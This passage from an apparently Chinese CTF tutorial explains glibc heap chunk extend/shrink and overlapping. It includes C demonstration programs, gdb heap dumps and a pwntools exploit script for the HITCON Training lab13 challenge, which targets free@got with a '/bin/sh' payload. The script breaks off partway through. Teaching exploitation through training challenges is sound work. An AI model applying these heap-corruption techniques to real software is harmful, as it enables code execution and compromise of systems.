<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x30</span>]  ←  Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x40</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x40</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x50</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x60</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x70</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure>

<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-<span class="number">0x8</span>], rax</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x602010</span></span><br></pre></td></tr></table></figure>



<h2 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x80</span>);//分配第一个 <span class="number">0x80</span> 的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第二个 <span class="number">0x10</span> 的chunk2</span><br><span class="line">    malloc(<span class="number">0x10</span>); //防止与top chunk合并</span><br><span class="line"></span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="在这个例子中，因为分配的-size-不处于-fastbin-的范围，因此在释放时如果与-top-chunk-相连会导致和-top-chunk-合并。所以我们需要额外分配一个-chunk，把释放的块与-top-chunk-隔开。"><a href="#在这个例子中，因为分配的-size-不处于-fastbin-的范围，因此在释放时如果与-top-chunk-相连会导致和-top-chunk-合并。所以我们需要额外分配一个-chunk，把释放的块与-top-chunk-隔开。" class="headerlink" title="在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。"></a>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;===chunk1 篡改size域</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== 防止合并的chunk</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== 被放入unsorted <span class="built_in">bin</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x00000000000000b0</span>  <span class="number">0x0000000000000020</span> &lt;=== 注意此处标记为空</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br><span class="line">[+] unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0xb0</span>, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x4005b0</span> &lt;main+<span class="number">74</span>&gt;        call   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">→   <span class="number">0x4005b5</span> &lt;main+<span class="number">79</span>&gt;        mov    QWORD PTR [rbp-<span class="number">0x8</span>], rax</span><br><span class="line"></span><br><span class="line">    rax : <span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure>



<h2 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h2><p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x80</span>);//分配第一个<span class="number">0x80</span>的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>);//分配第二个<span class="number">0x10</span>的chunk2</span><br><span class="line"></span><br><span class="line">    free(ptr);//首先进行释放，使得chunk1进入unsorted <span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=malloc(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次 malloc 之后的结果如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>我们首先释放 chunk1 使它进入 unsorted bin 中</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== 进入unsorted <span class="built_in">bin</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>然后篡改 chunk1 的 size 域</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== size域被篡改</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p>
<h2 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend&#x2F;Shrink 可以做什么"></a>Chunk Extend&#x2F;Shrink 可以做什么</h2><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd&#x2F;bk 指针从而可以实现 fastbin attack 等利用。</p>
<h2 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x10</span>);//分配第<span class="number">1</span>个 <span class="number">0x80</span> 的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">2</span>个 <span class="number">0x10</span> 的chunk2</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">3</span>个 <span class="number">0x10</span> 的chunk3</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">4</span>个 <span class="number">0x10</span> 的chunk4    </span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h2 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=malloc(<span class="number">128</span>);//smallbin1</span><br><span class="line">    ptr2=malloc(<span class="number">0x10</span>);//fastbin1</span><br><span class="line">    ptr3=malloc(<span class="number">0x10</span>);//fastbin2</span><br><span class="line">    ptr4=malloc(<span class="number">128</span>);//smallbin2</span><br><span class="line">    malloc(<span class="number">0x10</span>);//防止与top合并</span><br><span class="line">    free(ptr1);</span><br><span class="line">    *(<span class="built_in">int</span> *)((long long)ptr4-<span class="number">0x8</span>)=<span class="number">0x90</span>;//修改pre_inuse域</span><br><span class="line">    *(<span class="built_in">int</span> *)((long long)ptr4-<span class="number">0x10</span>)=<span class="number">0xd0</span>;//修改pre_size域</span><br><span class="line">    free(ptr4);//unlink进行前向extend</span><br><span class="line">    malloc(<span class="number">0x150</span>);//占位块</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h2 id="HITCON-Training-lab13"><a href="#HITCON-Training-lab13" class="headerlink" title="HITCON Training lab13"></a>HITCON Training lab13</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p>
<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hitcontraning_lab13 git:(master) file heapcreator</span><br><span class="line">heapcreator: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, <span class="keyword">not</span> stripped</span><br><span class="line">➜  hitcontraning_lab13 git:(master) checksec heapcreator</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>

<p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p>
<h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 off by one 的漏洞</strong>。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>基本利用思路如下</p>
<ol>
<li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
</ol>
<p>更加具体的还是直接看脚本吧。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;ddaa&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># overwrite heap 1&#x27;s struct&#x27;s size to 0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"><span class="comment"># trigger heap 1&#x27;s struct to fastbin 0x40</span></span><br><span class="line"><span class="comment"># heap 1&#x27;s content to fastbin 0x20</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># new heap 1&#x27;s struct will point to old heap 1&#x27;s content, size 0x20</span></span><br><span class="line"><span class="comment"># new heap 1&#x27;s content will point to old heap 1&#x27;s struct, size 0x30</span></span><br><span class="line"><span class="comment"># that is to say we can overwrite new heap 1&#x27;s struct</span></span><br><span class="line"><span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + 